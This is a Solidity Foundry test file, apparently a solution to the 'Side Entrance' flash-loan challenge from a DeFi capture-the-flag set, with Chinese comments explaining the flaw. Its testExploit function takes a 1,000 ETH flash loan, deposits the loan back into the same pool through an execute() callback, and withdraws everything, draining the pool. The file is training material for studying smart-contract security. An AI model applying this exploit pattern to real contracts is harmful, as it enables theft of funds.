// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    // 直接贷款1000e,把贷来的钱存进去再取出来
    // 原始合约的致命问题在于混了闪电贷池和存取款池的资金
    
    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        // 用etch把attack账户变成拥有闪电贷回调函数execute的合约账户
        ExecuteCode ec=new ExecuteCode();
        bytes memory code = address(ec).code;
        vm.etch(attacker, code);

        vm.startPrank(attacker);

        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
        sideEntranceLenderPool.withdraw();

        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

contract ExecuteCode{
    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value:1_000e18}();
    }
    fallback() payable external {}
}
